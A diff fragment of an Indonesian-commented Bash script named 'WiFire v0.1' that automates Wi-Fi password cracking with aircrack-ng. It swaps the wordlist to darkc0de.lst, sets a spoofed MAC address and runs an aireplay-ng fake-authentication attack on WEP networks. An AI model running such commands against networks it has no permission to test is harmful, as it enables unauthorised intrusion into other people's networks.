@@ -4,18 +4,18 @@
 # For my beloved qu33n ^^
 # WiFire v 0.1
 # Variabel dasar
-            mode="crack"                                 # AirCrack
-       interface="wlan0"                                 # Default
-           versi="0.1"                                   # Versi
-monitorInterface="mon0"                                  # Default
-           bssid=""                                      # null
-           essid=""                                      # null
-         channel=""                                      # null
-          client=""                                      # null
-        wordlist="/pentest/passwords/wordlists/wpa.txt"  # wordlist kamu
-         fakeMac="00:05:7c:9a:58:3f"                     # mac address palsu
-            plus="true"                                  # jika mendapatkan password, maka akan langsung dicoba
-            trap 'cleanup interrupt' 2                   # menangkap interrupt CTRL+C
+            mode="crack"                                       # AirCrack
+       interface="wlan0"                                       # Default
+           versi="0.1"                                         # Versi
+monitorInterface="mon0"                                        # Default
+           bssid=""                                            # null
+           essid=""                                            # null
+         channel=""                                            # null
+          client=""                                            # null
+        wordlist="/pentest/passwords/wordlists/darkc0de.lst"   # wordlist kamu
+         fakeMac="00:05:7c:9a:58:3f"                           # mac address palsu
+            plus="true"                                        # jika mendapatkan password, maka akan langsung dicoba
+            trap 'cleanup interrupt' 2                         # menangkap interrupt CTRL+C
 
 # Scanning
 cariAP() {
@@ -299,9 +299,7 @@ if [ "$mode" == "crack" ] ; then
    if [ "$encryption" == "WEP" ] ; then
       if [ "$client" == "N/A" ] ; then
          tampil aksi "Attack (FakeAuth): $fakeMac" 
-         #aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $mac $monitorInterface"   "true"
          aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 30 -o 1 -q 10 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" "true"
-         #if [Association successful] = then
          client=$mac
          sleep 1
       fi
